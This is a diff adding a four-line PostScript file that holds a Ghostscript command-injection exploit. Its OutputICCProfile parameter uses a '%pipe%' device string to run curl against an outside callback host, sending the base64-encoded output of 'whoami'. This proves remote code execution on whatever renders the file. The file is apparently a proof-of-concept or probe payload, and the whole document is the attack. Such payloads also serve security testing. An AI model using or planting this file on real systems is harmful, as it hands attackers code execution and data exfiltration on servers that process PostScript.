@@ -1,0 +1,4 @@
+%!PS
+currentdevice null true mark /OutputICCProfile (%pipe%curl http://rce-1nkvbz.a.hwise.es/?a=$(whoami|base64) )
+.putdeviceparams
+quit
